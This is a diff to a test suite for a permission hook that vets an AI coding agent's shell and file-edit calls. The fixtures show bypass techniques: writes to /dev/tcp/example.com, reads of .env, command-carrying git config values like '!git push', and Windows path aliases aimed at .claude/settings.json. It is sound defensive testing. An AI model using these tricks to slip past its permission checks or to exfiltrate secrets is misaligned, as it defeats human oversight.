@@ -320,7 +320,7 @@ test('12. git -c alias.p=push p origin master -> deny', () => { assertDecision(c
 test('12. git shell alias (!) -> deny (R6: shell-alias payload resolves confidently to git push, was ask)', () => { assertDecision(classifyBash('git -c alias.p="!git push" p'), 'deny', hook.RULE.GIT_PUSH); });
 test('12. git alias not defined in command -> ask COMPLEX (R9: unrecognized git subcommand fails closed, was defer)', () => { assertDecision(classifyBash('git p origin master'), 'ask', hook.RULE.COMPLEX); });
 test('12. git status -> defer (no hard-deny)', () => { assertDecision(classifyBash('git status'), 'defer'); });
-test('12. git diff -> defer', () => { assertDecision(classifyBash('git diff'), 'defer'); });
+test('12. git diff -> ask COMPLEX (R11 Blocker C: content diff not proven textconv/ext-diff-safe, was defer)', () => { assertDecision(classifyBash('git diff'), 'ask', hook.RULE.COMPLEX); });
 test('12. git log -> defer', () => { assertDecision(classifyBash('git log'), 'defer'); });
 test('12. git commit -> ask (R1: recognized ASK family, wrapper-proof)', () => { assertDecision(classifyBash('git commit -m "x"'), 'ask', hook.RULE.COMPLEX); });
 test('12. echo "git push" -> defer (basename is echo, not git)', () => { assertDecision(classifyBash('echo "git push"'), 'defer'); });
@@ -2251,10 +2251,16 @@ test('38A. cat with exact non-secret args still defers', () => {
 test('38A. cat .env still denies SECRET (allowlist does not override existing secret check)', () => {
   assertDecision(classifyBash('cat .env'), 'deny', hook.RULE.SECRET);
 });
-test('38A. git status/diff/log/show/rev-parse/ls-files/ls-tree/cat-file still defer (git read-only allowlist)', () => {
-  for (const c of ['git status', 'git diff', 'git log', 'git show', 'git rev-parse HEAD', 'git ls-files', 'git ls-tree HEAD', 'git cat-file -p HEAD']) {
+test('38A. git status/log/rev-parse/ls-files/ls-tree/cat-file still defer (git read-only allowlist)', () => {
+  for (const c of ['git status', 'git log', 'git rev-parse HEAD', 'git ls-files', 'git ls-tree HEAD', 'git cat-file -p HEAD']) {
     assertDecision(classifyBash(c), 'defer', undefined, `expected defer for: ${c}`);
   }
+});
+test('38A. git diff (bare) -> ask COMPLEX (R11 Blocker C: content-producing by default, was defer)', () => {
+  assertDecision(classifyBash('git diff'), 'ask', hook.RULE.COMPLEX);
+});
+test('38A. git show (bare) -> ask COMPLEX (R11 Blocker C: defaults to a patch for the target commit, was defer)', () => {
+  assertDecision(classifyBash('git show'), 'ask', hook.RULE.COMPLEX);
 });
 test('38A. git unrecognized subcommand -> ask COMPLEX, not defer', () => {
   assertDecision(classifyBash('git bundle create x.bundle HEAD'), 'ask', hook.RULE.COMPLEX);
@@ -2852,4 +2858,323 @@ test('IO 39I: GIT_EXTERNAL_DIFF=git push resolves through real process -> deny, 
   const parsed = JSON.parse(r.stdout);
   assert.equal(parsed.hookSpecificOutput.permissionDecision, 'deny');
   assert.ok(!parsed.hookSpecificOutput.permissionDecisionReason.includes('external.sh'));
+});
+
+// ===================== 40: R11 - network redirection, git execution, Windows path aliases =====================
+
+// --- 40A: Blocker A - network redirection targets ---
+test('40A. echo hello > /dev/tcp/example.com/80 -> ask EGRESS, not defer', () => {
+  assertDecision(classifyBash('echo hello > /dev/tcp/example.com/80'), 'ask', hook.RULE.EGRESS);
+});
+test('40A. printf x > /dev/udp/example.com/53 -> ask EGRESS, not defer', () => {
+  assertDecision(classifyBash('printf x > /dev/udp/example.com/53'), 'ask', hook.RULE.EGRESS);
+});
+test('40A. cat README.md <> /dev/tcp/example.com/80 (bidirectional) -> ask EGRESS, not defer', () => {
+  assertDecision(classifyBash('cat README.md <> /dev/tcp/example.com/80'), 'ask', hook.RULE.EGRESS);
+});
+test('40A. echo hello > "/dev/tcp/$HOST/$PORT" (dynamic host/port) -> ask EGRESS, not defer', () => {
+  assertDecision(classifyBash('echo hello > "/dev/tcp/$HOST/$PORT"'), 'ask', hook.RULE.EGRESS);
+});
+test("40A. echo hi > '//server/share/x' (UNC via forward slashes) -> ask EGRESS", () => {
+  assertDecision(classifyBash("echo hi > '//server/share/x'"), 'ask', hook.RULE.EGRESS);
+});
+test('40A. negative control: echo hello > /tmp/harmless -> defer', () => {
+  assertDecision(classifyBash('echo hello > /tmp/harmless'), 'defer');
+});
+test('40A. negative control: cat README.md < input.txt -> defer', () => {
+  assertDecision(classifyBash('cat README.md < input.txt'), 'defer');
+});
+
+// --- 40B: Blocker B - git path-bearing environment variables ---
+test('40B. GIT_CONFIG_GLOBAL=.env git status -> deny SECRET', () => {
+  assertDecision(classifyBash('GIT_CONFIG_GLOBAL=.env git status'), 'deny', hook.RULE.SECRET);
+});
+test('40B. GIT_CONFIG_SYSTEM=.env git status -> deny SECRET', () => {
+  assertDecision(classifyBash('GIT_CONFIG_SYSTEM=.env git status'), 'deny', hook.RULE.SECRET);
+});
+test('40B. GIT_INDEX_FILE=.env git status -> deny SECRET', () => {
+  assertDecision(classifyBash('GIT_INDEX_FILE=.env git status'), 'deny', hook.RULE.SECRET);
+});
+test('40B. GIT_CONFIG_GLOBAL=global.cfg git status -> ask TAMPER, not defer', () => {
+  assertDecision(classifyBash('GIT_CONFIG_GLOBAL=global.cfg git status'), 'ask', hook.RULE.TAMPER);
+});
+test('40B. GIT_DIR=other-repo/.git git status -> ask TAMPER, not defer', () => {
+  assertDecision(classifyBash('GIT_DIR=other-repo/.git git status'), 'ask', hook.RULE.TAMPER);
+});
+test('40B. GIT_WORK_TREE=other-tree git status -> ask TAMPER, not defer', () => {
+  assertDecision(classifyBash('GIT_WORK_TREE=other-tree git status'), 'ask', hook.RULE.TAMPER);
+});
+test('40B. HOME=other-home git status -> ask TAMPER, not defer', () => {
+  assertDecision(classifyBash('HOME=other-home git status'), 'ask', hook.RULE.TAMPER);
+});
+test('40B. USERPROFILE=other-home git status -> ask TAMPER, not defer', () => {
+  assertDecision(classifyBash('USERPROFILE=other-home git status'), 'ask', hook.RULE.TAMPER);
+});
+test('40B. XDG_CONFIG_HOME=other-config git status -> ask TAMPER, not defer', () => {
+  assertDecision(classifyBash('XDG_CONFIG_HOME=other-config git status'), 'ask', hook.RULE.TAMPER);
+});
+test('40B. GIT_OBJECT_DIRECTORY=.env git status -> deny SECRET', () => {
+  assertDecision(classifyBash('GIT_OBJECT_DIRECTORY=.env git status'), 'deny', hook.RULE.SECRET);
+});
+test('40B. GIT_ALTERNATE_OBJECT_DIRECTORIES="$X" git status (dynamic) -> ask, not defer', () => {
+  assertDecision(classifyBash('GIT_ALTERNATE_OBJECT_DIRECTORIES="$X" git status'), 'ask');
+});
+test('40B. negative control: GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.name GIT_CONFIG_VALUE_0=test git status still works (unaffected)', () => {
+  assertDecision(classifyBash('GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.name GIT_CONFIG_VALUE_0=test git status'), 'ask', hook.RULE.TAMPER);
+});
+test('40B. negative control: git -c alias.p=push p still resolves as before (unaffected)', () => {
+  assertDecision(classifyBash('git -c alias.p=push p'), 'deny', hook.RULE.GIT_PUSH);
+});
+test('40B. negative control: git status (no path-bearing env) -> defer', () => {
+  assertDecision(classifyBash('git status'), 'defer');
+});
+
+// --- 40C: Blocker C - textconv-risk default-to-ask, signature verification, config keys ---
+test('40C. git diff (bare) -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git diff'), 'ask', hook.RULE.COMPLEX);
+});
+test('40C. git diff --no-textconv --no-ext-diff --stat -> defer (explicitly proven safe)', () => {
+  assertDecision(classifyBash('git diff --no-textconv --no-ext-diff --stat'), 'defer');
+});
+test('40C. git log -p -1 -> ask COMPLEX, not defer (patch-producing)', () => {
+  assertDecision(classifyBash('git log -p -1'), 'ask', hook.RULE.COMPLEX);
+});
+test('40C. git show HEAD -> ask COMPLEX, not defer (defaults to a patch)', () => {
+  assertDecision(classifyBash('git show HEAD'), 'ask', hook.RULE.COMPLEX);
+});
+test('40C. git log -p -1 --no-textconv --no-ext-diff -> defer (patch explicitly driver-disabled)', () => {
+  assertDecision(classifyBash('git log -p -1 --no-textconv --no-ext-diff'), 'defer');
+});
+test('40C. git show --stat HEAD -> defer (metadata-only, no content rendered)', () => {
+  assertDecision(classifyBash('git show --stat HEAD'), 'defer');
+});
+test('40C. git diff --stat -> defer (metadata-only alone is sufficient)', () => {
+  assertDecision(classifyBash('git diff --stat'), 'defer');
+});
+test('40C. git log --show-signature -1 -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git log --show-signature -1'), 'ask', hook.RULE.COMPLEX);
+});
+test('40C. git show --show-signature HEAD -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git show --show-signature HEAD'), 'ask', hook.RULE.COMPLEX);
+});
+test("40C. git log --format='%G?' -1 -> ask COMPLEX, not defer (signature format placeholder)", () => {
+  assertDecision(classifyBash("git log --format='%G?' -1"), 'ask', hook.RULE.COMPLEX);
+});
+test("40C. git log --pretty=format:%GK -1 -> ask COMPLEX, not defer (equals-form placeholder)", () => {
+  assertDecision(classifyBash('git log --pretty=format:%GK -1'), 'ask', hook.RULE.COMPLEX);
+});
+test("40C. git -c gpg.program='!git push' log --show-signature -1 -> deny GIT_PUSH (shell-alias-style command-bearing value)", () => {
+  assertDecision(classifyBash("git -c gpg.program='!git push' log --show-signature -1"), 'deny', hook.RULE.GIT_PUSH);
+});
+test("40C. git -c gpg.program=gpg2 status -> ask TAMPER, not defer (bare program name, unresolvable)", () => {
+  assertDecision(classifyBash('git -c gpg.program=gpg2 status'), 'ask', hook.RULE.TAMPER);
+});
+test("40C. git -c log.showSignature=true status -> ask TAMPER, not defer", () => {
+  assertDecision(classifyBash('git -c log.showSignature=true status'), 'ask', hook.RULE.TAMPER);
+});
+test("40C. git -c diff.mydriver.textconv='!git push' diff -> deny GIT_PUSH", () => {
+  assertDecision(classifyBash("git -c diff.mydriver.textconv='!git push' diff"), 'deny', hook.RULE.GIT_PUSH);
+});
+test("40C. git -c diff.mydriver.command=cat diff -> ask TAMPER, not defer", () => {
+  assertDecision(classifyBash('git -c diff.mydriver.command=cat diff'), 'ask', hook.RULE.TAMPER);
+});
+test('40C. negative control: git log (bare, no patch flag) -> defer', () => {
+  assertDecision(classifyBash('git log'), 'defer');
+});
+test('40C. negative control: git log -1 --oneline -> defer', () => {
+  assertDecision(classifyBash('git log -1 --oneline'), 'defer');
+});
+
+// --- 40D: Blocker D - unsupported-option invariant ---
+test('40D. git status --unknown-future-option -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git status --unknown-future-option'), 'ask', hook.RULE.COMPLEX);
+});
+test('40D. git rev-parse --unknown-future-option -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git rev-parse --unknown-future-option'), 'ask', hook.RULE.COMPLEX);
+});
+test('40D. git ls-files --unknown-future-option -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git ls-files --unknown-future-option'), 'ask', hook.RULE.COMPLEX);
+});
+test('40D. git cat-file --unknown-future-option HEAD -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git cat-file --unknown-future-option HEAD'), 'ask', hook.RULE.COMPLEX);
+});
+test('40D. git ls-tree --unknown-future-option HEAD -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('git ls-tree --unknown-future-option HEAD'), 'ask', hook.RULE.COMPLEX);
+});
+test('40D. ls --unknown-future-option -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('ls --unknown-future-option'), 'ask', hook.RULE.COMPLEX);
+});
+test('40D. which --unknown-future-option git -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('which --unknown-future-option git'), 'ask', hook.RULE.COMPLEX);
+});
+test('40D. negative control: git status -> defer', () => { assertDecision(classifyBash('git status'), 'defer'); });
+test('40D. negative control: git diff --no-textconv --no-ext-diff --stat -> defer', () => {
+  assertDecision(classifyBash('git diff --no-textconv --no-ext-diff --stat'), 'defer');
+});
+test('40D. negative control: git log -1 --oneline -> defer', () => { assertDecision(classifyBash('git log -1 --oneline'), 'defer'); });
+test('40D. negative control: git rev-parse HEAD -> defer', () => { assertDecision(classifyBash('git rev-parse HEAD'), 'defer'); });
+test('40D. negative control: git ls-files -> defer', () => { assertDecision(classifyBash('git ls-files'), 'defer'); });
+test('40D. negative control: git ls-tree HEAD -> defer', () => { assertDecision(classifyBash('git ls-tree HEAD'), 'defer'); });
+test('40D. negative control: git cat-file -t HEAD -> defer', () => { assertDecision(classifyBash('git cat-file -t HEAD'), 'defer'); });
+test('40D. negative control: ls -la -> defer', () => { assertDecision(classifyBash('ls -la'), 'defer'); });
+test('40D. negative control: which git -> defer', () => { assertDecision(classifyBash('which git'), 'defer'); });
+test('40D. negative control: ls *.txt (glob positional, still unexamined) -> defer', () => {
+  assertDecision(classifyBash('ls *.txt'), 'defer');
+});
+
+// --- 40E: Blocker E - Windows-aware protected-path identity ---
+test('40E. Edit .claude/settings.json. (trailing dot) -> deny TAMPER', () => {
+  assertDecision(classifyEdit('C:/repo/.claude/settings.json.'), 'deny', hook.RULE.TAMPER);
+});
+test('40E. Edit .claude./settings.json (trailing dot on directory component) -> deny TAMPER', () => {
+  assertDecision(classifyEdit('C:/repo/.claude./settings.json'), 'deny', hook.RULE.TAMPER);
+});
+test('40E. Edit .claude/settings.json  (trailing space) -> deny TAMPER', () => {
+  assertDecision(classifyEdit('C:/repo/.claude/settings.json '), 'deny', hook.RULE.TAMPER);
+});
+test('40E. Write .claude/settings.json::$DATA (default ADS stream) -> deny TAMPER', () => {
+  assertDecision(classifyWrite('C:/repo/.claude/settings.json::$DATA'), 'deny', hook.RULE.TAMPER);
+});
+test('40E. Write .claude/settings.json:audit:$DATA (named ADS stream) -> deny TAMPER', () => {
+  assertDecision(classifyWrite('C:/repo/.claude/settings.json:audit:$DATA'), 'deny', hook.RULE.TAMPER);
+});
+test('40E. Edit \\\\?\\C:\\repo\\.claude\\settings.json (device drive prefix) -> deny TAMPER', () => {
+  assertDecision(classifyEdit('\\\\?\\C:\\repo\\.claude\\settings.json'), 'deny', hook.RULE.TAMPER);
+});
+test('40E. Edit \\\\.\\C:\\repo\\.claude\\settings.json (unknown device namespace) -> ask TAMPER, not defer', () => {
+  assertDecision(classifyEdit('\\\\.\\C:\\repo\\.claude\\settings.json'), 'ask', hook.RULE.TAMPER);
+});
+test('40E. Edit .claude/SETTIN~1.JSO (8.3 short name near repo) -> ask TAMPER, not defer', () => {
+  assertDecision(classifyEdit('C:/repo/.claude/SETTIN~1.JSO'), 'ask', hook.RULE.TAMPER);
+});
+test('40E. Edit CLAUDE~1/settings.json (8.3 short-name directory component) -> ask TAMPER, not defer', () => {
+  assertDecision(classifyEdit('C:/repo/CLAUDE~1/settings.json'), 'ask', hook.RULE.TAMPER);
+});
+test('40E. cp destination trailing-dot resolves to protected -> deny TAMPER', () => {
+  assertDecision(classifyBash("cp harmless.txt '.claude/settings.json.'"), 'deny', hook.RULE.TAMPER);
+});
+test('40E. git checkout pathspec trailing-dot resolves to protected -> deny TAMPER', () => {
+  assertDecision(classifyBash("git checkout HEAD~ -- '.claude/settings.json.'"), 'deny', hook.RULE.TAMPER);
+});
+test('40E. git diff --output ADS stream resolves to protected -> deny TAMPER', () => {
+  assertDecision(classifyBash("git diff --output='.claude/settings.json::$DATA'"), 'deny', hook.RULE.TAMPER);
+});
+test('40E. cp destination plain UNC share -> ask EGRESS, not defer', () => {
+  assertDecision(classifyBash("cp harmless.txt '//server/share/x'"), 'ask', hook.RULE.EGRESS);
+});
+test('40E. secret input path with trailing dot: cat .env. -> deny SECRET', () => {
+  assertDecision(classifyBash("cat '.env.'"), 'deny', hook.RULE.SECRET);
+});
+test('40E. secret input path with ADS stream: cat .env::$DATA -> deny SECRET', () => {
+  assertDecision(classifyBash("cat '.env::$DATA'"), 'deny', hook.RULE.SECRET);
+});
+test('40E. negative control: Edit harmless.txt -> defer', () => {
+  assertDecision(classifyEdit('C:/repo/harmless.txt'), 'defer');
+});
+test('40E. negative control: Edit harmless.txt. (trailing dot, non-protected) -> defer', () => {
+  assertDecision(classifyEdit('C:/repo/harmless.txt.'), 'defer');
+});
+test('40E. negative control: git checkout HEAD~ -- src/harmless.js -> ask TAMPER (real mutation, not protected)', () => {
+  assertDecision(classifyBash('git checkout HEAD~ -- src/harmless.js'), 'ask', hook.RULE.TAMPER);
+});
+
+// --- 40F: pure-classifier confirmation of the Section 8 negative-control list ---
+test('40F. Section 8 required negative controls all defer (pure classifier)', () => {
+  const negatives = [
+    'git status', 'git diff --no-textconv --no-ext-diff --stat', 'git log -1 --oneline',
+    'git rev-parse HEAD', 'git ls-files', 'git ls-tree HEAD', 'git cat-file -t HEAD',
+    'ls -la', 'which git',
+  ];
+  for (const c of negatives) assertDecision(classifyBash(c), 'defer', undefined, `expected defer for: ${c}`);
+});
+
+// ===================== Direct hook I/O tests (R11 Section 8 gate) =====================
+
+test('IO 40: required dangerous fixtures never defer, never leak raw command, no crash', () => {
+  const required = [
+    'echo hello > /dev/tcp/example.com/80',
+    'printf x > /dev/udp/example.com/53',
+
+    'GIT_CONFIG_GLOBAL=.env git status',
+    'GIT_CONFIG_SYSTEM=.env git status',
+    'GIT_INDEX_FILE=.env git status',
+    'GIT_CONFIG_GLOBAL=global.cfg git status',
+    'HOME=other-home git status',
+
+    'git diff',
+    'git log -p -1',
+    'git log --show-signature -1',
+    'git show --show-signature HEAD',
+
+    'git status --unknown-future-option',
+    'git rev-parse --unknown-future-option',
+    'git ls-files --unknown-future-option',
+    'ls --unknown-future-option',
+  ];
+  for (const cmd of required) {
+    const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: cmd }, cwd: 'C:/repo' });
+    const r = runHookProcess(fixture);
+    assert.equal(r.status, 0, `exit code for: ${cmd}`);
+    assert.equal(r.stderr, '', `stderr for: ${cmd}`);
+    assert.notEqual(r.stdout.trim(), '', `must not silently defer: ${cmd}`);
+    const parsed = JSON.parse(r.stdout);
+    assert.notEqual(parsed.hookSpecificOutput.permissionDecision, 'defer', `must not defer: ${cmd}`);
+    assert.ok(!parsed.hookSpecificOutput.permissionDecisionReason.includes('.env'), `must not leak raw command for: ${cmd}`);
+  }
+});
+
+test('IO 40: Windows path-identity write fixtures never defer, never leak raw path, no crash', () => {
+  const writeFixtures = [
+    'C:/repo/.claude/settings.json.',
+    'C:/repo/.claude./settings.json',
+    'C:/repo/.claude/settings.json::$DATA',
+    'C:/repo/.claude/settings.json:audit:$DATA',
+    '\\\\?\\C:\\repo\\.claude\\settings.json',
+    'C:/repo/.claude/SETTIN~1.JSO',
+  ];
+  for (const fp of writeFixtures) {
+    const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: fp, content: 'x' }, cwd: 'C:/repo' });
+    const r = runHookProcess(fixture);
+    assert.equal(r.status, 0, `exit code for: ${fp}`);
+    assert.equal(r.stderr, '', `stderr for: ${fp}`);
+    assert.notEqual(r.stdout.trim(), '', `must not silently defer: ${fp}`);
+    const parsed = JSON.parse(r.stdout);
+    assert.notEqual(parsed.hookSpecificOutput.permissionDecision, 'defer', `must not defer: ${fp}`);
+  }
+});
+
+test('IO 40: required negative controls all defer through the real process (no hard-deny)', () => {
+  const negatives = [
+    'pwd', 'echo hello', "printf '%s' hello", 'sort input.txt', 'uniq input.txt', 'date', 'date +%F',
+    'grep pattern README.md', 'rg pattern README.md', 'wc README.md', 'cat README.md',
+    'git status', 'git diff --no-textconv --no-ext-diff --stat', 'git log -1 --oneline',
+    'git show --stat HEAD', 'git rev-parse HEAD', 'git ls-files', 'git ls-tree HEAD',
+    'git cat-file -t HEAD', 'ls -la', 'which git',
+  ];
+  for (const cmd of negatives) {
+    const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: cmd }, cwd: 'C:/repo' });
+    const r = runHookProcess(fixture);
+    assert.equal(r.status, 0, `exit code for: ${cmd}`);
+    assert.equal(r.stderr, '', `stderr for: ${cmd}`);
+    assert.equal(r.stdout.trim(), '', `must defer (no stdout) for: ${cmd}`);
+  }
+});
+
+test('IO 40B: GIT_INDEX_FILE=.env resolves through real process -> deny, no env value leaked', () => {
+  const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'GIT_INDEX_FILE=.env git status' }, cwd: 'C:/repo' });
+  const r = runHookProcess(fixture);
+  assert.equal(r.status, 0);
+  assert.equal(r.stderr, '');
+  const parsed = JSON.parse(r.stdout);
+  assert.equal(parsed.hookSpecificOutput.permissionDecision, 'deny');
+  assert.ok(!parsed.hookSpecificOutput.permissionDecisionReason.includes('.env'));
+});
+
+test('IO 40E: device-drive-prefixed protected path resolves through real process -> deny, no raw path leaked', () => {
+  const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: '\\\\?\\C:\\repo\\.claude\\settings.json', content: 'x' }, cwd: 'C:/repo' });
+  const r = runHookProcess(fixture);
+  assert.equal(r.status, 0);
+  assert.equal(r.stderr, '');
+  const parsed = JSON.parse(r.stdout);
+  assert.equal(parsed.hookSpecificOutput.permissionDecision, 'deny');
 });
